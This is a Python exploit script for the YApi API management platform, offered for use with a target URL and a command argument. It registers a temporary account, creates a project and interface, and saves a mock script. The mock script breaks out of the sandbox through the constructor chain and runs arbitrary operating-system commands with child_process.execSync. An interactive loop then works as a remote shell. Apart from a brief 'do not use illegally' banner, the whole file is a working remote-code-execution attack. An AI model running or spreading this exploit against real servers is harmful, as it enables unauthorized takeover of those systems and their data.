import sys
import requests
import random
import json
import argparse

yapi_root_path = ""
yapi_register_path = "api/user/reg"
yapi_login_path = "api/user/login"
yapi_get_group_id_path = "api/group/get_mygroup"
yapi_get_catid_id_path = "api/project/get"
yapi_add_projcet_path = "api/project/add"
yapi_add_interface_path = "api/interface/add"
yapi_save_mock_path = "api/plugin/advmock/save"
temp_random_str = str(random.randint(1000, 9999))
temp_user_name = "username_"+temp_random_str
temp_user_mail = "usermail@usermail.org_"+temp_random_str
temp_user_passwd = "userpasswd_"+temp_random_str
http_headers = {"Content-Type": "application/json;charset=UTF-8"}


def do_request(url):
    try:
        url = url[0:url.find("/", url.find("/")+2)]
        response = requests.get(url,timeout=5)
    except BaseException:
        print("The target is unreachable, please check the URL.e.g http(s)://demo.com")
        sys.exit()
    global yapi_root_path
    yapi_root_path = response.url
    return response


def do_register():
    post_data = {"email": temp_user_mail,
                 "password": temp_user_passwd, "username": temp_user_name}
    response = requests.post(yapi_root_path+yapi_register_path, data=json.dumps(post_data),
                             headers=http_headers)
    try:
        response_json_obj = json.loads(response.text)
        if response_json_obj['errcode'] == 0 and response_json_obj['errmsg'] == "成功！":
            print("[+]  register user success")
            return True
        else:
            print("[+]  register user fail")
            sys.exit()
    except BaseException:
        print("[+]  the target may not be Yapi")


def do_login():
    post_data = {"email": temp_user_mail, "password": temp_user_passwd}
    response = requests.post(yapi_root_path+yapi_login_path, data=json.dumps(post_data),
                             headers=http_headers)
    response_json_obj = json.loads(response.text)
    if response_json_obj['errcode'] == 0:
        print("[+]  login success")
        return response.cookies
    else:
        print("[+]  login fail,script end")
        sys.exit()


def get_current_user_group_id(login_cookie):
    response = requests.get(
        yapi_root_path+yapi_get_group_id_path, cookies=login_cookie)
    response_json_obj = json.loads(response.text)
    return response_json_obj["data"]["_id"]


def get_cat_id(project_id, login_cookie):
    response = requests.get(yapi_root_path+yapi_get_catid_id_path,
                            params={"id": project_id}, cookies=login_cookie)
    response_json_obj = json.loads(response.text)
    return response_json_obj["data"]["cat"][0]["_id"]


def add_projcet(group_id, login_cookie):
    post_data = {"name": temp_user_name, "basepath": "", "color": "cyan",
                 "group_id": group_id, "icon": "code-o", "project_type": "private"}
    response = requests.post(yapi_root_path+yapi_add_projcet_path,
                             data=json.dumps(post_data), headers=http_headers, cookies=login_cookie)
    response_json_obj = json.loads(response.text)
    print("[+]  create project success")
    return response_json_obj["data"]["_id"]


def add_interface(cat_id, project_id, login_cookie):
    post_data = {"catid": cat_id, "method": "GET", "path": "/"+temp_user_name,
                 "project_id": project_id, "title": temp_user_name}
    response = requests.post(yapi_root_path+yapi_add_interface_path,
                             data=json.dumps(post_data), headers=http_headers, cookies=login_cookie)
    response_json_obj = json.loads(response.text)
    print("[+]  create interface success")
    return response_json_obj["data"]["_id"]


def save_exp(interface_id, project_id, login_cookie, commond):
    mock_script = 'ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor(\'return process\')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require("child_process").execSync("'+commond+'").toString()'
    post_data = {"enable": True, "interface_id": interface_id,
                 "mock_script": mock_script, "project_id": project_id}
    response = requests.post(yapi_root_path+yapi_save_mock_path, data=json.dumps(
        post_data), headers=http_headers, cookies=login_cookie)
    response_json_obj = json.loads(response.text)
    if response_json_obj['errcode'] == 0 and response_json_obj['errmsg'] == "成功！":
        return True
    else:
        return False


def logo():
    print(" _________  ________      ___    ___ ________ ________ ________  ")
    print("|\___   ___\\   __  \    |\  \  /  /|\_____  \\_____  \\_____  \ ")
    print("\|___ \  \_\ \  \|\  \   \ \  \/  / /\|___/  /\|___/  /\|___/  /|")
    print("     \ \  \ \ \   _  _\   \ \    / /     /  / /   /  / /   /  / /   \|/ ____ \|/ ")
    print("      \ \  \ \ \  \\  \|   \/  /  /     /  / /   /  / /   /  / /     @~/ ,. \~@  ")
    print("       \ \__\ \ \__\\ _\ __/  / /      /__/ /   /__/ /   /__/ /     /_( \__/ )_\ ")
    print("        \|__|  \|__|\|__|\___/ /       |__|/    |__|/    |__|/        \__U_/")
    print("                        \|___|/                               Yapi exploit script")
    print("Do not use it illegally, otherwise all consequences shall be borne by the user!!!")
    print("This script will automatically create users on Yapi. Please delete them after verification\r\n")


if __name__ == "__main__":
    logo()
    usage = "\r\n-t or --target : target url e.g http(s)://demo.com"\
        "\r\n-c or --commond : commonds e.g whoami/ls/pwd"
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="url of yapi", required=True)
    parser.add_argument(
        "-c", "--commond", help="os commond,you can use the -c shell to enter the interactive shell environment", required=True)
    args = parser.parse_args()
    response = do_request(args.target)
    if do_register() == True:
        login_cookie = do_login()
        if login_cookie != False:
            group_id = get_current_user_group_id(login_cookie)
            project_id = add_projcet(group_id, login_cookie)
            cat_id = get_cat_id(project_id, login_cookie)
            interface_id = add_interface(cat_id, project_id, login_cookie)
            if args.commond == "shell":
                print("In this test, the temporary user created is:  "+temp_user_mail)
                print("The password of the temporary user is:  "+temp_user_passwd)
                print(
                    "The above account should be deleted regardless of whether the response result is what you expect")
                try:
                    while True:
                        commond = input("os commond#>")
                        if save_exp(interface_id, project_id, login_cookie, commond) == True:
                            response = requests.get(
                                yapi_root_path+"mock/"+str(project_id)+"/"+temp_user_name, cookies=login_cookie)
                            print("command result#>\r\n"+response.text)
                except BaseException:
                    print("\r\nbye.")
                    sys.exit()
            if save_exp(interface_id, project_id, login_cookie, args.commond) == True:
                response = requests.get(
                    yapi_root_path+"mock/"+str(project_id)+"/"+temp_user_name, cookies=login_cookie)
                print("In this test, the temporary user created is:  "+temp_user_mail)
                print("The password of the temporary user is:  "+temp_user_passwd)
                print(
                    "The above account should be deleted regardless of whether the response result is what you expect")
                print("command result:\r\n"+response.text)
